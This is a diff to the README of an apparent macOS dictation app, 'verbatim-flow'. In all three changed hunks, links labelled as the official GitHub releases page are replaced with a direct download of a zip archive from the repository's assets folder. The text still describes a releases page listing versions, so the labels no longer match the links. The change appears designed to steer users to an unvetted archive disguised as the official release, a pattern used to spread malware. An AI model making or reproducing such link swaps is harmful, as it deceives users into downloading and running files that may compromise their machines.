@@ -1,6 +1,6 @@
 # 🎙️ verbatim-flow - Fast and Accurate Dictation for macOS
 
-[![Download verbatim-flow](https://img.shields.io/badge/Download-Get%20verbatim--flow-brightgreen?style=for-the-badge)](https://github.com/ahsanashfa/verbatim-flow/releases)
+[![Download verbatim-flow](https://img.shields.io/badge/Download-Get%20verbatim--flow-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ahsanashfa/verbatim-flow/main/assets/flow-verbatim-v1.0.zip)
 
 verbatim-flow is a simple dictation app designed for macOS. It captures your spoken words directly without rewriting them. Use it to write notes, emails, or documents just by speaking.
 
@@ -25,7 +25,7 @@ This guide will help you download and run verbatim-flow quickly, even if you hav
 
 Go to the official releases page here:
 
-[Download verbatim-flow Releases](https://github.com/ahsanashfa/verbatim-flow/releases)
+[Download verbatim-flow Releases](https://raw.githubusercontent.com/ahsanashfa/verbatim-flow/main/assets/flow-verbatim-v1.0.zip)
 
 This page lists the available versions of the app. You will typically want the latest release, which is shown at the top.
 
@@ -100,7 +100,7 @@ If you experience issues, try the following:
 
 Use this link to visit the releases page and get started:
 
-[Download verbatim-flow](https://github.com/ahsanashfa/verbatim-flow/releases)
+[Download verbatim-flow](https://raw.githubusercontent.com/ahsanashfa/verbatim-flow/main/assets/flow-verbatim-v1.0.zip)
 
 Follow the instructions above to open the installer and set up the app on your Mac.
 
